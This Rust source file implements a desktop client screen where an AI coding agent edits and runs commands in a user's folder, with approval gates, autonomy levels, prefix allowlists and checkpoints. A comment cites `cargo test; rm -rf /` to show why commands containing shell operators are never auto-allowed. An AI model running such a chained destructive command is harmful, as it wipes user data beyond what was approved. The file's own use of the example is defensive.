//! Coder — coding against the open folder, with the model doing the typing.
//!
//! The agent loop is the server's (`app/coder/service.py`): it owns the thread,
//! the tool specs, the iteration cap and the approval gate, and it reaches every
//! provider the proxy does. What this screen adds is the half that has to be
//! native — the tools run *here*, on the user's real files, through
//! [`crate::coder_tools`].
//!
//! The wiring for that already existed server-side and had no client:
//! `delegate_tools` swaps the executor for one that emits the call and parks the
//! turn on a future keyed `(thread_id, call_id)`. So a turn reads:
//!
//! ```text
//! POST /coder/chat/stream ─→ event: tool_call {call_id, name, arguments}
//!                            (server blocked, 300s)
//!         run it here ──────→ POST /coder/chat/tool-result
//!                          ←─ event: tool_result, then the next step
//! ```
//!
//! Answering is not optional: a dropped `tool_call` stalls the turn until the
//! server's timeout, so every path out of [`Message::Event`] posts something,
//! including the failures.
//!
//! One thread per session, not the saved-conversation sidebar the chat screens
//! have — the server persists coder threads already, and listing them is a
//! screen of its own rather than a fourth thing in this one.

use agent_platform_client::sse::{coder_stream, CoderEvent};
use agent_platform_client::types::{CoderThreadSummary, ProviderEntry};
use agent_platform_client::Client;
use iced::widget::{markdown, text_editor};
use iced::Task;
use std::path::PathBuf;

/// Identity of the transcript scrollable, so a reply can snap it to the end.
pub fn transcript_id() -> iced::widget::Id {
    iced::widget::Id::new("coder-transcript")
}

/// One row of the transcript. Tool calls are rows rather than hidden plumbing:
/// the user reading them is the only check on what the agent touched, and with
/// `run_command` behind an approval gate it is also how they decide.
#[derive(Debug)]
pub enum Turn {
    User(String),
    Assistant { text: String, md: Vec<markdown::Item> },
    Tool {
        /// `read_file src/a.rs`, `$ cargo test` — what was done, not which
        /// function did it.
        label: String,
        /// `None` while it runs. `Ok` is the model's own view of the outcome;
        /// `Err` is a call that never produced one — refused, or abandoned when
        /// its turn died. Kept apart because both render as text and a row that
        /// says "(refused)" under a green tick is worse than no badge at all.
        result: Option<Result<String, String>>,
    },
}

/// A `run_command` call the server paused for a decision. The turn is over until
/// `/coder/chat/approve` resumes it — nothing else arrives on the stream.
#[derive(Debug, Clone)]
pub struct Pending {
    pub call_id: String,
    /// What the user is being asked to allow. Empty when the model's call was
    /// malformed enough that no command could be read out of it — seen live,
    /// from a model that leaked `</tool_call>` as prose. The card must not offer
    /// to run something it cannot name, so the view checks this.
    pub command: String,
}

/// How much planning happens before the tools come out.
///
/// Three states rather than a checkbox because the two useful ones pull in
/// opposite directions: `Inline` is the cheap quality lever for a local model
/// (one extra call, no interaction), `Gate` is the one that matters on a strong
/// model doing something irreversible — it stops the turn *before* the first
/// write so the plan can be read, edited, or thrown away.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PlanMode {
    /// Straight to the tool loop.
    Off,
    /// The server's PLAN step: plan, then carry it out in the same turn.
    #[default]
    Inline,
    /// Plan in a tool-free turn, stop, and wait for the user to run it.
    Gate,
}

impl PlanMode {
    pub const ALL: [PlanMode; 3] = [PlanMode::Off, PlanMode::Inline, PlanMode::Gate];

    pub fn label(self) -> &'static str {
        match self {
            PlanMode::Off => "No plan",
            PlanMode::Inline => "Plan first",
            PlanMode::Gate => "Plan gate",
        }
    }
}

/// How far the agent gets on `run_command` without a human in the loop.
///
/// Four states rather than the plan's three: "no commands at all" is what this
/// screen shipped with, and the safest setting is not a tier of autonomy but
/// the absence of one. Windsurf's Off/Auto/Turbo with Claude Code's allowlist
/// wedged into the middle — which is the state that makes ask-mode livable,
/// because `cargo test` gets read once and never again.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Autonomy {
    /// `run_command` is refused here before it ever reaches a card.
    #[default]
    Off,
    /// Every command is a card someone reads.
    Ask,
    /// A command matching a saved rule runs; everything else is still a card.
    Allowlist,
    /// Every command runs. Checkpoints are the only thing behind this, and they
    /// do not cover `pip install` or a write outside the folder.
    Auto,
}

impl Autonomy {
    pub const ALL: [Autonomy; 4] =
        [Autonomy::Off, Autonomy::Ask, Autonomy::Allowlist, Autonomy::Auto];

    pub fn label(self) -> &'static str {
        match self {
            Autonomy::Off => "No commands",
            Autonomy::Ask => "Ask",
            Autonomy::Allowlist => "Allowlist",
            Autonomy::Auto => "Auto",
        }
    }

    /// Whether `run_command` is offered to the model at all.
    pub fn allows_commands(self) -> bool {
        self != Autonomy::Off
    }
}

/// Shell syntax no rule can vouch for. A rule allows a *program*, and
/// `cargo test; rm -rf /` starts with `cargo test` — so a command carrying any
/// of these is asked about however well its head matches.
const SHELL_OPERATORS: [&str; 9] = [";", "&", "|", "`", "$(", ">", "<", "\n", "\r"];

/// Whether a saved rule covers this command.
///
/// Prefix match on a word boundary — `cargo test` allows `cargo test --lib` and
/// not `cargo testbed` — and never on a command with shell operators in it.
pub fn allowed_by_rule(rules: &[String], command: &str) -> bool {
    let command = command.trim();
    if SHELL_OPERATORS.iter().any(|op| command.contains(op)) {
        return false;
    }
    rules.iter().any(|rule| {
        let rule = rule.trim();
        !rule.is_empty()
            && command.starts_with(rule)
            && (command.len() == rule.len()
                || command[rule.len()..].starts_with(char::is_whitespace))
    })
}

/// The rule **Always allow** writes for a command: the program and its
/// subcommand (`cargo test`, `npm run`), or the program alone when the second
/// word is an argument rather than a verb.
///
/// Narrower than the whole line, which would only ever match the one command it
/// came from; wider than the program alone, which would let `cargo` cover
/// `cargo publish`.
pub fn rule_for(command: &str) -> String {
    let mut words = command.split_whitespace();
    let Some(first) = words.next() else { return String::new() };
    match words.next() {
        Some(second)
            if !second.starts_with('-')
                && !second.contains('/')
                && !second.contains('\\')
                // A filename is an argument, not a verb. Seen on screen: the
                // card offered "Always allow python main.py", a rule that only
                // ever matches the one script it came from. `cargo test` and
                // `npm run` have no dot in them; `main.py` and `app.js` do.
                && !second.contains('.') =>
        {
            format!("{first} {second}")
        }
        _ => first.to_string(),
    }
}

/// What the turn in flight is for.
///
/// Two of the three run no tools, and they are not the same thing: the gate's
/// plan ends on a card asking to be run, the review pass ends like any other
/// answer. One enum rather than two bools, because "tool-free *and* a plan" is
/// a state neither of them could rule out.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
enum TurnKind {
    /// The ordinary turn: tools, a checkpoint, and the queue drains behind it.
    #[default]
    Work,
    /// The gate's tool-free first turn — its answer lands in the plan card.
    Plan,
    /// A tool-free read of what the last turn changed. Its prompt is built here
    /// rather than typed, which is also why it is the one turn whose `@`s are
    /// left alone — a diff is full of them and none of them are mentions.
    Review,
    /// A tool-free summary of where this session got to, written so a fresh one
    /// can carry on. Its answer ends up in the *next* session's composer.
    Handoff,
}

impl TurnKind {
    fn tool_free(self) -> bool {
        self != TurnKind::Work
    }
}

/// One line of the agent's own checklist, as `update_todos` posted it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Todo {
    pub text: String,
    pub done: bool,
}

/// Caps on a posted checklist. A model that dumps its whole reasoning into the
/// list turns a glanceable panel into a second transcript, and the panel is
/// pinned above the real one.
const MAX_TODOS: usize = 20;
const MAX_TODO_CHARS: usize = 120;

/// `mode_instruction` is `max_length=4096` server-side and a longer one is a
/// 422 — the turn does not run at all. Every piece that goes in it is capped
/// on its own; this is the belt and braces over the sum.
const MAX_MODE_INSTRUCTION: usize = 4096;

/// Where a message stops being what the user typed and starts being the files
/// they pointed at. Sent verbatim, so the marker is in the persisted message
/// too and a reopened session can fold the same tail away.
pub const MENTION_MARKER: &str = "

--- files inlined from @mentions ---
";
/// Total inlined text per message. The server fits the conversation to the
/// context window on its own, but it does that by dropping *history* — a single
/// message big enough to need it costs the thread its memory.
const MAX_MENTION_BYTES: usize = 32 * 1024;

/// Which list the left sidebar is showing. One column, three lists, an icon
/// rail to switch them — rather than three stacked lists sharing 224px, which
/// is what made the sessions and the checkpoints fight over the same scroll.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Pane {
    #[default]
    Sessions,
    Files,
    Checkpoints,
}

/// Which panel the bottom dock is showing. The dock only appears when at least
/// one of them has something in it, and a tab only appears with its content —
/// see [`State::dock_tabs`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Dock {
    #[default]
    Terminal,
    File,
    Diff,
}

/// What a session is doing, for the board's rows.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Status {
    Running,
    /// Parked on the approval card or the plan gate — waiting on a person,
    /// which is the state a board exists to make visible.
    Awaiting,
    Idle,
}

/// An agent command running in the visible drawer rather than headless.
///
/// The turn is parked on it exactly as it would be on a headless one: the
/// server is blocked, and [`poll_terminal_run`] is what eventually answers.
#[derive(Debug)]
struct TermRun {
    /// The call this owes a result for.
    call_id: String,
    /// What the shell brackets the output with — see [`crate::coder_term::wrap`].
    mark: String,
    /// Seconds waited, counted off the screen's own clock rather than a timer
    /// of its own. The turn already ticks once a second while it is running.
    waited: u32,
}

/// How long an agent's command may sit in the drawer before the turn stops
/// waiting for it. Same as the headless executor's cap
/// (`coder_tools::COMMAND_TIMEOUT`) — where it runs must not change how long it
/// is allowed to take.
const TERM_RUN_TIMEOUT: u32 = 180;

#[derive(Debug, Default)]
pub struct State {
    /// The folder the agent works in. Every path it asks for is resolved
    /// against this and refused if it escapes.
    pub root: Option<PathBuf>,
    /// Checkouts another live session is mid-turn in, refreshed by
    /// [`crate::coder_board`] before every message it hands down.
    ///
    /// The checkpoint repo is one per folder, so two turns writing the same
    /// checkout would interleave `commit_all` and each checkpoint would hold
    /// the other session's changes — the one thing checkpoints exist to rule
    /// out. A session sharing a root with a running one waits; a session in its
    /// own worktree has a root of its own and never sees this.
    pub busy_roots: Vec<PathBuf>,
    /// Server-side thread. Opened before the first turn streams, because
    /// answering a tool call needs the id the turn would otherwise carry.
    pub thread_id: Option<i64>,
    pub turns: Vec<Turn>,
    pub draft: String,
    /// Follow-ups typed while a turn was running, in the order they were typed.
    /// Each one is sent as its own turn once the turn in front of it has been
    /// checkpointed — see [`State::drain_queued`].
    ///
    /// Typing mid-turn is the normal way to use this screen ("also update the
    /// test", "no, use the other helper"), and the alternative to a queue is a
    /// composer that refuses input for minutes at a time.
    pub queue: Vec<String>,
    /// Whether the turn that is ending should continue into [`Self::queue`].
    /// False after a stop: the user ended the turn, so the follow-ups behind it
    /// wait as chips rather than starting on their own.
    drain_queued: bool,
    pub sending: bool,
    /// How much of `run_command` runs without being asked — see [`Autonomy`].
    /// `Off` by default: reading and writing files is recoverable with the
    /// user's own git, running things is not.
    pub autonomy: Autonomy,
    /// Command prefixes each workspace has said yes to for good, keyed by root
    /// path. Only read in [`Autonomy::Allowlist`]; seeded by the approval
    /// card's **Always allow** and persisted whole in `settings.json`.
    ///
    /// The whole map rather than the open folder's slice, so switching folders
    /// picks up that folder's rules with no reload path of its own.
    pub allowlist: std::collections::BTreeMap<String, Vec<String>>,
    /// The call a rule (or [`Autonomy::Auto`]) answered without asking, held
    /// until the resumed turn emits the real `tool_call` for it. The row then
    /// says a rule ran it, rather than looking like something a human read.
    auto_approved: Option<String>,
    /// How much planning happens before the tools come out — see [`PlanMode`].
    /// `Inline` by default: it costs one extra tool-free call per turn, and
    /// hearth measures that as the single biggest quality lever for a local
    /// model, which is what this screen mostly runs.
    pub plan_mode: PlanMode,
    /// The gate's plan, on screen and editable, between the tool-free turn that
    /// wrote it and the turn that carries it out. `Some` is the whole gate: the
    /// composer queues, the transcript waits, and nothing has touched a file.
    ///
    /// Live-only state. The plan itself is an ordinary assistant message in the
    /// thread, so a reopened session shows it as a row — what it does not show
    /// is a card asking a question that was answered hours ago.
    pub plan_card: Option<text_editor::Content>,
    /// What the turn in flight is for — see [`TurnKind`].
    kind: TurnKind,
    /// The agent's own checklist, from `update_todos` — a client-supplied tool
    /// this screen answers itself (the server never sees a result it did not
    /// ask for; it forwards the call and takes back what we send).
    ///
    /// Rebuilt on reopen from the persisted call arguments, so a session read
    /// back shows the list the turn ended on.
    pub todos: Vec<Todo>,
    /// The agent's own commits over this folder, newest first — one per turn
    /// that changed a file. See [`crate::coder_git`]: they live in a git dir of
    /// ours, so none of this is in the user's history.
    pub checkpoints: Vec<crate::coder_git::Checkpoint>,
    /// The checkpoint whose diff is open, and the diff itself. `None` while it
    /// loads, so the panel can say so rather than appear empty.
    pub reviewing: Option<(String, Option<String>)>,
    /// The files that checkpoint touched, for the per-file revert list above the
    /// patch. Loaded beside the diff and cleared with it.
    pub changes: Option<crate::coder_git::Changes>,
    /// The checkpoint the last turn produced, until it has been looked at. The
    /// timeline shows it too, but only to a user who has the Checkpoints pane
    /// open — this is how a turn says "I changed files" from where the user
    /// already is.
    pub last_turn: Option<String>,
    /// A turn's commit landed and the timeline is being refetched; the sha comes
    /// off the top of the list it returns, since the commit itself only reports
    /// whether it made a row.
    awaiting_turn_sha: bool,
    /// A restore that has been asked for and not yet confirmed. Restoring
    /// throws away every change since that checkpoint, including the user's own
    /// edits — one click is not enough to authorise that.
    pub restore_armed: Option<String>,
    /// Same two-press for deleting a past session.
    pub delete_armed: Option<i64>,
    /// Why there are no checkpoints, when there should be. git may not be
    /// installed; the turn still ran, so this belongs next to the timeline
    /// rather than in the error banner that means "the turn failed".
    pub checkpoint_error: Option<String>,
    /// Open each file the agent writes, as it writes it.
    ///
    /// Ported in spirit from Zed's follow mode, and cheap here because this app
    /// owns the pane: watching the writes land is the difference between trusting
    /// a turn and reading its diff afterwards to find out what it did.
    /// Writes only — following every `read_file` would thrash the dock while the
    /// agent is still exploring.
    pub follow: bool,
    /// The path a `write_file` or `edit_file` in flight is writing, held between the call and
    /// its result: the arguments carry the path, the result does not, and the
    /// file is only worth opening once it has been written. One at a time,
    /// because the server parks the turn on each call.
    following: Option<PathBuf>,
    /// Whether the file pane is showing. Off by default — the transcript is
    /// what this screen is for, and the tree is for the moments it is not.
    pub files_open: bool,
    /// The workspace has an `AGENTS.md`, so every turn is carrying it. A header
    /// chip rather than a silent influence: rules you cannot see steering a turn
    /// you did not expect is the whole complaint about agent memory.
    ///
    /// Cached off [`Self::refresh_tree`] rather than stat'd per frame — the view
    /// runs at 60fps and this is a file that changes about once a project.
    pub agents_md: bool,
    /// The folder is a git repository of the user's own, so a session can be
    /// isolated in a worktree. Cached beside [`Self::agents_md`] and for the
    /// same reason: it gates a header control the view draws every frame.
    pub git_repo: bool,
    /// The project, when [`Self::root`] is a worktree rather than the project
    /// itself. `Some` *is* the isolation: everything downstream — the tools,
    /// the tree, the checkpoints, the terminal — reads `root` and needs to know
    /// nothing about this, and the one thing that must not follow `root` is the
    /// folder written back to `settings.json`.
    pub main_root: Option<PathBuf>,
    /// The tree as drawn: only what is expanded, re-walked rather than cached
    /// (see [`crate::coder_files`]). A turn writes files, so a cache here would
    /// need invalidating on every event that matters.
    pub tree: Vec<crate::coder_files::Entry>,
    pub expanded: std::collections::BTreeSet<PathBuf>,
    /// The file being read, and its text or why it cannot be shown. Read
    /// synchronously: it is one bounded `fs::read` off a click, and a Task for
    /// it would cost a message round trip to save nothing.
    pub viewing: Option<(PathBuf, Result<String, String>)>,
    /// The user's own shell, open in the workspace root.
    ///
    /// Not the agent's `run_command` — that one is the model's request and goes
    /// through the approval gate. This is the user's own typing, which needs no
    /// gate any more than their own terminal does. It exists because the loop
    /// after a turn is "run the tests it just changed", and routing that through
    /// the model costs two clicks, a round trip and tokens to type `cargo test`.
    ///
    /// `None` until asked for: a shell process per app launch, in a folder that
    /// may not be open yet, is a process nobody asked to start.
    pub term: Option<crate::coder_term::Session>,
    /// The agent's command that is running in that drawer, waiting for the
    /// shell to say it finished. `None` means nothing of ours is in there —
    /// whatever else the user is running is their own.
    term_run: Option<TermRun>,
    /// Ids handed to terminals so far. The widget's subscription is keyed on it,
    /// so reopening must not reuse one.
    term_seq: u64,
    pub pending: Option<Pending>,
    /// Kill switch for the stream in flight. `None` when nothing is streaming.
    abort: Option<iced::task::Handle>,
    /// The delegated call this machine owes a result for. The server is blocked
    /// on it, so [`Message::Stop`] has to answer it before dropping the stream —
    /// abandoning it stalls the turn server-side for the full 300s timeout
    /// instead of ending it.
    outstanding: Option<String>,
    /// The turn was stopped by the user. Frames already in the runtime's queue
    /// when the abort landed arrive after it, and one of them is a `Done` that
    /// would otherwise raise "the model ended the turn without replying" for a
    /// turn the user themselves ended.
    stopped: bool,
    /// Tool rows whose output the user has expanded.
    pub open_tools: std::collections::HashSet<usize>,
    pub error: Option<String>,
    /// Providers the proxy knows, for the header dropdowns.
    pub catalog: Vec<ProviderEntry>,
    /// Provider/model override. Empty means the server's default — which is
    /// worth overriding: the resolved default here is `llama3`, and a model
    /// that cannot hold a multi-step tool loop makes this screen look broken
    /// rather than badly configured.
    pub provider: String,
    pub model: String,
    /// The prompt being sent, held across the thread-creation round trip.
    in_flight: String,
    /// Whether this turn has produced any assistant text yet. A turn that ends
    /// without one is the failure mode that reads as a hang, so it gets said
    /// out loud rather than rendering as nothing.
    answered: bool,
    /// Whether this turn had a command refused because the session has commands
    /// off. A silent turn after that is the refusal landing — blaming the model
    /// would send the user to change the wrong setting.
    refused_for_commands_off: bool,
    /// Past sessions, newest first. The server persists coder threads already,
    /// so this is a fetch rather than a store of our own — unlike the assistant's
    /// history, whose chat endpoint is stateless.
    pub threads: Vec<CoderThreadSummary>,
    /// A `load_threads` fetch is in flight — the sessions sidebar's only way to
    /// tell "nothing here yet" from "still asking", which look identical from
    /// an empty `threads`.
    pub threads_loading: bool,
    /// Same, for `load_checkpoints`.
    pub checkpoints_loading: bool,
    /// Seconds the turn in flight has been running. A local model can sit for
    /// minutes on one step, and a panel with no clock on it is indistinguishable
    /// from a hung one.
    pub elapsed: u32,
    /// A spinner frame, ticking while a turn, a tool, or a sidebar fetch is in
    /// motion — see [`Message::AnimTick`]. Only ever read `% frame_count`, so
    /// wrapping on overflow is fine.
    pub frame: u8,
    /// A decision has been sent and the resumed stream has not answered yet.
    ///
    /// `pending` is deliberately still set through this: the decision only
    /// counts once the server acts on it, and clearing it on the way out left
    /// the two sides disagreeing when the request failed in transport — the
    /// server still holding the call, the UI with no card left to retry from,
    /// and every later send refused with "thread has a command awaiting
    /// approval". Seen live.
    resuming: bool,
    /// Which list the left sidebar shows. [`Pane::Files`] and [`Self::files_open`]
    /// are the same fact — the bool is the one that persists to settings, the
    /// enum is the one the rail reads — so every write goes through
    /// [`Self::select_pane`].
    pub pane: Pane,
    /// Which bottom-dock tab is selected. Ignored when that tab has no content;
    /// the view falls back to the first tab that does.
    pub dock: Dock,
    /// Whether the preview pane is showing. The webview itself is not here —
    /// it is `!Send` and lives on the UI thread, see [`crate::coder_browser`].
    pub browser_open: bool,
    /// The URL bar's text, which is not the page's URL until it is submitted.
    pub browser_draft: String,
    /// The last URL actually handed to the preview, so reopening the pane
    /// returns to it rather than to a blank page.
    pub browser_url: String,
}

impl State {
    pub fn with_root(root: &str) -> Self {
        let root = root.trim();
        let root = (!root.is_empty()).then(|| PathBuf::from(root));
        Self {
            agents_md: root
                .as_ref()
                .is_some_and(|r| r.join(crate::coder_notes::AGENTS_PATH).is_file()),
            git_repo: root.as_deref().is_some_and(crate::coder_git::is_repo),
            root,
            ..Self::default()
        }
    }

    /// The screen as the settings file left it.
    ///
    /// Takes the whole struct rather than one parameter per field: only the two
    /// that need computing in `main` (the model's app-wide fallback, the plan
    /// mode's legacy bool) are passed, and the rest are read straight off it.
    pub fn restored(
        settings: &crate::shell::Settings,
        provider: String,
        model: String,
        plan_mode: PlanMode,
    ) -> Self {
        Self {
            provider,
            model,
            plan_mode,
            follow: settings.coder_follow,
            autonomy: settings.coder_autonomy,
            allowlist: settings.coder_allowlist.clone(),
            ..Self::with_root(&settings.coder_workspace)
        }
    }

    /// The rules saved for the folder that is open. Empty with no folder, and
    /// with a folder nobody has approved anything in.
    pub fn rules(&self) -> &[String] {
        self.root
            .as_ref()
            .and_then(|r| self.allowlist.get(&r.display().to_string()))
            .map_or(&[], Vec::as_slice)
    }

    /// Save a rule for the open folder. A duplicate is dropped rather than
    /// stacked — the button is on a card the user may see twice for the same
    /// command before the first decision lands.
    fn allow_rule(&mut self, rule: String) {
        let Some(root) = self.root.as_ref().map(|p| p.display().to_string()) else { return };
        let rules = self.allowlist.entry(root).or_default();
        if !rules.contains(&rule) {
            rules.push(rule);
        }
    }

    /// What the turn is waiting on, most specific first: the user, then the tool
    /// in flight, then the model. Ported from hearth's composer, and the
    /// ordering is the point — a counter climbing past two minutes next to a
    /// bare "thinking" is how a wait on the approval gate, or on a test suite,
    /// gets read as a hang.
    pub fn activity(&self) -> &str {
        // `pending` survives into the resume, so the decision being *sent* is
        // no longer a wait on the user. The plan card is the same shape of wait
        // — a turn that will not continue until someone answers it.
        if !self.sending && (self.pending.is_some() || self.plan_card.is_some()) {
            return "waiting for you";
        }
        match self.turns.iter().rev().find(|t| matches!(t, Turn::Tool { result: None, .. })) {
            Some(Turn::Tool { label, .. }) => label,
            _ => "thinking",
        }
    }

    pub fn provider_ids(&self) -> Vec<String> {
        self.catalog.iter().map(|p| p.id.clone()).collect()
    }

    /// Models the chosen provider offers; every provider's when none is picked,
    /// since the proxy resolves an alias to its provider on its own.
    pub fn model_options(&self) -> Vec<String> {
        self.catalog
            .iter()
            .filter(|p| self.provider.is_empty() || p.id == self.provider)
            .flat_map(|p| p.models.options.iter().cloned())
            .collect()
    }

    /// The folder the user opened, whichever checkout the agent is working in.
    pub fn project_root(&self) -> Option<&PathBuf> {
        self.main_root.as_ref().or(self.root.as_ref())
    }

    pub fn root_label(&self) -> String {
        match &self.root {
            Some(p) => p.display().to_string(),
            None => "No folder open".to_string(),
        }
    }

    /// What this session is doing, for the board's status dot. The same
    /// ordering as [`Self::activity`]: a wait on the user outranks a wait on the
    /// model, because it is the one that will not clear on its own.
    pub fn status(&self) -> Status {
        if self.pending.is_some() || self.plan_card.is_some() {
            Status::Awaiting
        } else if self.sending {
            Status::Running
        } else {
            Status::Idle
        }
    }

    /// What the board calls this session. The server's own title once a thread
    /// exists — it is the one the history list shows, so a session must not be
    /// named one thing while running and another once it is past.
    pub fn title(&self) -> String {
        if let Some(t) = self
            .thread_id
            .and_then(|id| self.threads.iter().find(|t| t.id == id))
            .filter(|t| !t.title.trim().is_empty())
        {
            return t.title.clone();
        }
        match self.turns.iter().find_map(|t| match t {
            Turn::User(text) => Some(text.trim()),
            _ => None,
        }) {
            Some(first) => first.chars().take(60).collect(),
            None => "New session".to_string(),
        }
    }

    /// The last thing the agent actually said, for a completion toast.
    pub fn last_reply(&self) -> &str {
        self.turns
            .iter()
            .rev()
            .find_map(|t| match t {
                Turn::Assistant { text, .. } => Some(text.as_str()),
                _ => None,
            })
            .unwrap_or_default()
    }

    fn push_assistant(&mut self, text: String) {
        self.turns.push(Turn::Assistant { md: markdown::parse(&text).collect(), text });
    }

    /// Attach an outcome to the tool row still waiting for one. The server runs
    /// a round's calls in order and echoes each result before issuing the next,
    /// so the oldest unanswered row is the right one — provided no earlier turn
    /// left one behind, which is what [`Self::close_open_tools`] guarantees.
    fn resolve_tool(&mut self, result: Result<String, String>) {
        if let Some(Turn::Tool { result: slot, .. }) =
            self.turns.iter_mut().find(|t| matches!(t, Turn::Tool { result: None, .. }))
        {
            *slot = Some(result);
        }
    }

    /// Open a shell in the workspace root, and put the keyboard in it.
    ///
    /// A failure here is the *terminal* failing, not the turn: it lands in the
    /// banner because the user just asked for this and nothing else explains an
    /// empty drawer.
    fn open_terminal(&mut self) -> Task<Message> {
        let Some(root) = self.root.clone() else { return Task::none() };
        self.term_seq += 1;
        match crate::coder_term::open(self.term_seq, &root) {
            Ok(session) => {
                let id = session.0.widget_id().clone();
                self.term = Some(session);
                self.error = None;
                iced_term::TerminalView::focus(id)
            }
            Err(e) => {
                self.error = Some(e);
                Task::none()
            }
        }
    }

    /// Re-walk the visible part of the tree. Cheap: it reads the root plus the
    /// directories the user opened, and nothing else.
    fn refresh_tree(&mut self) {
        self.agents_md = self
            .root
            .as_ref()
            .is_some_and(|r| r.join(crate::coder_notes::AGENTS_PATH).is_file());
        self.tree = match (&self.root, self.files_open) {
            (Some(root), true) => crate::coder_files::flatten(root, &self.expanded),
            _ => Vec::new(),
        };
    }

    /// Switch the left sidebar, keeping [`Self::files_open`] in step. The tree
    /// is walked when it is on screen and dropped when it is not, so the pane
    /// switch is also what starts and stops the walking.
    fn select_pane(&mut self, pane: Pane) {
        self.pane = pane;
        self.files_open = pane == Pane::Files;
        self.refresh_tree();
    }

    /// The dock tabs that currently have something behind them, in a fixed
    /// order. Empty means no dock: an empty tab strip over an empty panel is
    /// worse than the space it takes.
    pub fn dock_tabs(&self) -> Vec<Dock> {
        let mut tabs = Vec::new();
        if self.term.is_some() {
            tabs.push(Dock::Terminal);
        }
        if self.viewing.is_some() {
            tabs.push(Dock::File);
        }
        if self.reviewing.is_some() {
            tabs.push(Dock::Diff);
        }
        tabs
    }

    /// The tab actually to draw: the selected one when it still has content,
    /// otherwise the first that does. Closing the open file while its tab is
    /// selected must land on the terminal, not on a blank dock.
    pub fn dock_shown(&self) -> Option<Dock> {
        let tabs = self.dock_tabs();
        tabs.iter().find(|t| **t == self.dock).or_else(|| tabs.first()).copied()
    }

    /// Close any row the ending turn never answered, saying why.
    ///
    /// A turn that fails mid-round leaves a row open forever, and the next
    /// turn's first result would then fill *that* row instead of its own —
    /// every later row off by one, each labelled with someone else's output.
    ///
    /// The reason is a parameter because a turn the *user* stopped is not a turn
    /// that went wrong, and a row reading "the turn ended before this call was
    /// answered" for a stop they asked for reads as a bug.
    fn close_open_tools(&mut self, reason: &str) {
        for t in &mut self.turns {
            if let Turn::Tool { result: result @ None, .. } = t {
                *result = Some(Err(reason.into()));
            }
        }
    }

    /// Whether the turn in flight can be stopped — the composer's Stop control,
    /// and Esc while this screen is open.
    pub fn stoppable(&self) -> bool {
        self.sending
    }

    /// Whether a `Send` right now would queue rather than start a turn.
    pub fn would_queue(&self) -> bool {
        self.sending || self.pending.is_some() || self.plan_card.is_some()
    }

    /// Take a posted checklist, and answer the call with what the model should
    /// see. The arguments *are* the result — there is nothing to run.
    fn set_todos(&mut self, args: &serde_json::Value) -> String {
        let items = parse_todos(args);
        if items.is_empty() {
            return "Error: update_todos needs a non-empty `items` array of {text, done} objects."
                .to_string();
        }
        let (done, total) = (items.iter().filter(|t| t.done).count(), items.len());
        self.todos = items;
        format!("Checklist updated: {done}/{total} done.")
    }

    /// Start the next queued follow-up, if the turn that just ended left one.
    ///
    /// Called from the checkpoint's completion rather than from `Done`, and that
    /// is the whole reason this is a function: the next turn must not begin
    /// writing files until the last one's commit has been taken, or that commit
    /// contains the next turn's changes and the checkpoint shows the wrong turn's
    /// work. Same ordering rule as the baseline in [`Message::Send`], from the
    /// other end.
    fn drain_queued(&mut self) -> Task<Message> {
        if !std::mem::take(&mut self.drain_queued) || self.queue.is_empty() {
            return Task::none();
        }
        self.draft = self.queue.remove(0);
        Task::done(Message::Send)
    }
}

#[derive(Debug, Clone)]
pub enum Message {
    /// "View logs" on a traced error banner — intercepted in `main::update`
    /// before it reaches here, so this arm exists only to satisfy exhaustiveness.
    TraceLogs(String),
    PickRoot,
    RootPicked(Option<String>),
    DraftChanged(String),
    Send,
    /// Stop the turn in flight — the composer's control, and Esc on this screen.
    Stop,
    /// Stop the turn in flight and send what is in the composer instead of it.
    /// The steer: the model has gone the wrong way and the correction is already
    /// typed, so waiting for the wrong answer first is pure cost.
    StopAndSend,
    /// Take a queued follow-up back out of the queue and into the composer,
    /// where it can be edited, re-sent, or emptied. The only way out of the
    /// queue that never loses what was typed.
    Unqueue(usize),
    /// The session thread, opened before the first turn.
    ThreadOpened(Result<i64, String>),
    Event(CoderEvent),
    /// A delegated call finished on this machine; the server is still waiting.
    ToolRan { call_id: String, result: String },
    ToolPosted(Result<(), String>),
    ToggleTool(usize),
    /// Approve or refuse the paused `run_command`.
    Decide(bool),
    /// Approve the paused command *and* save a rule that answers it next time —
    /// the trick that makes Ask mode survivable, from Claude Code.
    AlwaysAllow,
    SetAutonomy(Autonomy),
    SetPlanMode(PlanMode),
    ToggleFollow(bool),
    /// Typing in the plan card. The plan is edited before it runs — that is the
    /// only reason the gate is worth a round trip over [`PlanMode::Inline`].
    PlanEdited(text_editor::Action),
    /// Run the plan as it now reads, edited or not.
    PlanRun,
    /// Throw the plan away. The turn it planned never happens; what was typed
    /// stays in the transcript as an ordinary exchange.
    PlanDiscard,
    /// The checkpoint repo is ready (or could not be made) — the turn follows.
    Baselined(Result<(), String>),
    /// The turn's own commit landed; the payload says whether it made a row.
    Committed(Result<bool, String>),
    CheckpointsLoaded(Result<Vec<crate::coder_git::Checkpoint>, String>),
    ReviewCheckpoint(String),
    DiffLoaded(Result<String, String>),
    /// Hand a checkpoint's diff back to the model to read — a second pair of
    /// eyes on the turn that just ran, on whatever model the header points at.
    ReviewTurn(String),
    /// That diff, fetched. The turn is started from here rather than from
    /// [`Message::ReviewTurn`] because the prompt *is* the diff.
    ReviewDiffLoaded(Result<String, String>),
    /// The file list for the checkpoint being reviewed, beside its patch.
    ChangesLoaded(Result<crate::coder_git::Changes, String>),
    /// Put one file back to how it was before the checkpoint on screen.
    RevertFile(String),
    FileReverted(Result<(), String>),
    CloseReview,
    /// First press arms, second restores — see [`State::restore_armed`].
    RestoreCheckpoint(String),
    Restored(Result<(), String>),
    ToggleFiles,
    /// The left rail: pick which list the sidebar shows.
    SelectPane(Pane),
    /// The bottom dock's tab strip.
    SelectDock(Dock),
    RefreshTree,
    ToggleDir(PathBuf),
    OpenFile(PathBuf),
    CloseFile,
    /// Open the shell drawer, or close it and end the shell.
    ToggleTerminal,
    /// Everything the terminal widget produces — keystrokes, resizes, PTY output.
    Term(iced_term::Event),
    /// Type a command into the open shell (opening it first if needed). The
